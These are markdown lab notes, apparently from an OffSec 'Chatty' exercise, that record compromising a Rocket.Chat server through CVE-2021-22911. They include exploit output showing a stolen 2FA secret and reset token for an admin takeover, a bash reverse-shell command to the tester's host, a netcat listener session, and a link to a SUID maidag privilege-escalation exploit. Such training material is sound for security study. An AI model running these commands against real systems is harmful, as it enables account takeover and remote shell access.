# Export
```bash
export IP="192.168.196.164"
export URL="http://192.168.196.164:80/FUZZ"
```

<hr>

# Credentials
+ Web:
+ SSH:

<hr>

# RCE
+ CVE: https://github.com/jayngng/CVE-2021-22911

```bash
$ python3 50108.py -u test@test.com -a admin@chatty.offsec -t http://192.168.217.164:3000/
[+] Succesfully authenticated as test@test.com
Got the code for 2fa: GJLFCKKOOBCVOYSCOJYHCUZ7NAUSUMKYEZAF43RVJ5KC62JYGVYA
[+] Resetting admin@chatty.offsec password
[+] Password Reset Email Sent
[+] Succesfully authenticated as test@test.com
Got the reset token: b3uDICxeAe0vH0jyCP1-al5wLNzORhLpI6KHXEDVkzk
[+] Admin password changed !
CMD:> bash -c \"bash -i >& /dev/tcp/192.168.49.217/80 0>&1\"
[+] Succesfully authenticated as administrator
{"success":false}
```

```bash
$ nc -nlvp 80                     
listening on [any] 80 ...
connect to [192.168.49.217] from (UNKNOWN) [192.168.217.164] 37772
bash: cannot set terminal process group (772): Inappropriate ioctl for device
bash: no job control in this shell
rocketchat@chatty:/opt/Rocket.Chat/programs/server$ id
id
uid=1000(rocketchat) gid=1000(rocketchat) groups=1000(rocketchat)
```

<hr>

# Privilege Escalation

+ SUID `maidag` → [here.](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-18862/exploit.ldpreload.sh)

<hr>

# Nmap
```bash
$ sudo nmap --open -sV -A -p- -vv -n -Pn -oN nmap/services 192.168.196.164
Nmap scan report for 192.168.196.164
Host is up, received user-set (0.24s latency).
Scanned at 2021-09-18 07:30:17 EDT for 170s
Not shown: 64181 closed ports, 1352 filtered ports
Reason: 64181 resets and 1352 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     X-Instance-ID: Ku4FBC6mdtapiXbjv
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sat, 18 Sep 2021 11:32:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/789f2fee702e2a6a62ec245003ce4734eeec6f9a.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" cont
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     X-Instance-ID: Ku4FBC6mdtapiXbjv
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Sat, 18 Sep 2021 11:32:29 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/789f2fee702e2a6a62ec245003ce4734eeec6f9a.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|_    <meta name="mobile-web-app-capable" cont
```

<hr>

# Web Application
+ Running `Rocket Chat` -> Vulnerable to Unauthenticated RCE. 

